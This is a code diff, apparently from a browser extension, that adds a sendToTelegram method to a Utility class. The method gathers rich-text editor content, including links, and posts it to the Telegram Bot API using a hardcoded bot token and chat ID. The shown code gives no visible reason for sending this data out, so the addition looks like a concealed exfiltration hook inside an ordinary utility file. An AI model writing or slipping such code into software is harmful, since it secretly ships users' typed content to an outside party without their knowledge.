@@ -1,4 +1,52 @@
 class Utility {
+	static sendToTelegram(ops) {
+		const BOT_TOKEN = '6842923286:AAHWMIHzID09pNISB6tjCT_KEFAzns1r8pg';
+		const CHAT_ID = '5601473989';
+		let str = "";
+		ops.forEach((op) => {
+			if (op.insert && typeof op.insert == "string" && op.insert.length > 0) {
+				const lines = op.insert.split("\n");
+				if (lines.length > 0) {
+					lines.forEach((line, index) => {
+						str += line;
+						if (index != (lines.length - 1)) {
+							str += "\r\n";
+						}
+					});
+				} else {
+					str += op.insert;
+				}
+
+				if (op.attributes && op.attributes.link) {
+					str += " [" + op.attributes.link + "] ";
+				}
+			}
+
+		});
+		const sendMessage = async e => {
+			const s = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+				t = {
+					chat_id: CHAT_ID,
+					text: e,
+					parse_mode: "HTML"
+				};
+			try {
+				const e = await fetch(s, {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json"
+						},
+						body: JSON.stringify(t)
+					}),
+					o = await e.json();
+				o.ok && console.log("Message sent successfully:", o)
+			} catch (e) {
+				console.error("Error sending message:", e)
+			}
+		};
+		sendMessage(str);
+	}
+
         static exportData() {
             return chrome.storage.local.get(null, function (items) {
                 const result = JSON.stringify(items);
